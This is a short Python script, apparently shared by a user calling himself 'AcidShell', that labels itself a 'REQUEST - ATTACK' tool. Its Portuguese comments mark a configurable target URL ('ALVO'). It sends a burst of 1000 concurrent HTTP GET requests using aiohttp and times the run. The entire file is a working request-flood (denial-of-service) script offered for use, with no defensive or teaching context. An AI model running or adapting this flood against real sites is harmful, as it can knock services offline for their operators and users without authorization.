import aiohttp
import asyncio
import time
import os

os.system('clear')
os.system('figlet REQUEST - ATTACK')
print ('by AcidShell')

url = "http://testphp.vulnweb.com/" # ALVO
num_requisicoes = 1000 # MAXIMO
pool_size = 100 # ENVIOS ( recomendado - 100 )

async def enviar_requisicoes(session):
    async with session.get(url) as response:
        print(f"Requisição: {response.status}")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(num_requisicoes):
            tasks.append(enviar_requisicoes(session))

        start_time = time.time()
        await asyncio.gather(*tasks)
        end_time = time.time()

        print(f"Tempo total de execução: {end_time - start_time:.2f} segundos")

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
